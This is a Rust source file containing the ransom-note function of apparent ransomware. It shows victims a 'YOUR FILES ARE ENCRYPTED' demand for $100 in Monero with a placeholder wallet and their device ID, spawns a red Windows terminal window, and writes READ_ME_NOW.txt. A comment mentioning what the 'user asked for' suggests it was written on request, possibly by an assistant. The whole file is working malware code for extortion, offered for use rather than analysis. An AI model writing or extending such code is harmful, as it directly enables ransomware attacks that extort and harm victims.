use std::process::Command;

pub fn show_note(victim_pub: &str) {
    let message = format!(
        "YOUR FILES ARE ENCRYPTED!\\n\\n\
        To decrypt, send 100$ equivalent in XMR (Monero) to:\\n\
        4...[Wallet Address]...\\n\\n\
        Include this DEVICE ID in the payment message:\\n\
        {}\\n\\n\
        Do NOT restart. Do NOT delete files.",
        victim_pub
    );

    #[cfg(windows)]
    {
        // Option 1: MessageBox via Powershell (Simpler than WinAPI)
        // Option 2: Spawn cmd.exe
        // User asked for "Terminal window".
        let cmd_script = format!(
            "color 4f && \
             echo ================================================= && \
             echo !!! YOUR FILES ARE ENCRYPTED !!! && \
             echo ================================================= && \
             echo. && \
             echo Send 100$ XMR to: 4xxxx-xxxx-xxxx && \
             echo. && \
             echo DEVICE ID: {} && \
             echo. && \
             echo Include DEVICE ID in payment! && \
             pause",
             victim_pub
        );
        
        let _ = Command::new("cmd")
            .args(&["/C", "start", "cmd", "/K", &cmd_script])
            .spawn();
            
        // Also write to Desktop
        let _ = std::fs::write("READ_ME_NOW.txt", &message.replace("\\n", "\n"));
    }

    #[cfg(not(windows))]
    {
        println!("{}", message.replace("\\n", "\n"));
    }
}
